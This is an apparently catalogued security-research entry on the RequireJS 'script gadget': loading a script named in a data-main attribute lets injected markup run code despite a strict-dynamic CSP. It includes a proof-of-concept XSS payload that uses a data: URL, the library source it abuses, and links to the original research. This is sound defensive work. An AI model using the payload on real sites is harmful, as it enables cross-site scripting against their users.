---
description: RequireJS loads plain JavaScript files as well as more defined modules. It is optimized for in-browser use, including in a Web Worker, but it can be used in other JavaScript environments, like Rhino and Node. It implements the Asynchronous Module API.
github: requirejs/requirejs
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - script-tag
      - data-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [RequireJS](https://github.com/requirejs/requirejs) library loads scripts from the `data-main` attribute on `script` tags.
        code: |
          <!-- user input -->
          <script data-main='data:1,alert(document.domain)'></script>

          <script type="text/javascript" src="https://requirejs.org/docs/release/2.3.2/comments/require.js" nonce="secret"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/requirejs/requirejs/blob/945ae6b41ef81851a030d93759bd36ac75a39958/require.js#L139">https://github.com/requirejs/requirejs/blob/945ae6b41ef81851a030d93759bd36ac75a39958/require.js#L139</a>

      ```javascript
      function scripts() {
          return document.getElementsByTagName('script');
      }
      ```

      Source: <a target="_blank" href="https://github.com/requirejs/requirejs/blob/945ae6b41ef81851a030d93759bd36ac75a39958/require.js#L2010">https://github.com/requirejs/requirejs/blob/945ae6b41ef81851a030d93759bd36ac75a39958/require.js#L2010</a>

      ```javascript
      eachReverse(scripts(), function (script) {
          //Set the 'head' where we can append children by
          //using the script's parent.
          if (!head) {
              head = script.parentNode;
          }

          //Look for a data-main attribute to set main script for the page
          //to load. If it is there, the path to data main becomes the
          //baseUrl, if it is not already set.
          dataMain = script.getAttribute('data-main');
          if (dataMain) {
              //Preserve dataMain in case it is a path (i.e. contains '?')
              mainScript = dataMain;

              //Set final baseUrl if there is not already an explicit one,
              //but only do so if the data-main value is not a loader plugin
              //module ID.
              if (!cfg.baseUrl && mainScript.indexOf('!') === -1) {
                  //Pull off the directory of data-main for use as the
                  //baseUrl.
                  src = mainScript.split('/');
                  mainScript = src.pop();
                  subPath = src.length ? src.join('/')  + '/' : './';

                  cfg.baseUrl = subPath;
              }

              //Strip off any trailing .js since mainScript is now
              //like a module name.
              mainScript = mainScript.replace(jsSuffixRegExp, '');

              //If mainScript is still a path, fall back to dataMain
              if (req.jsExtRegExp.test(mainScript)) {
                  mainScript = dataMain;
              }

              //Put the data-main script in the files to load.
              cfg.deps = cfg.deps ? cfg.deps.concat(mainScript) : [mainScript];

              return true;
          }
      });
      ```
    links:
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/requirejs.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/requirejs_exploit.php
---
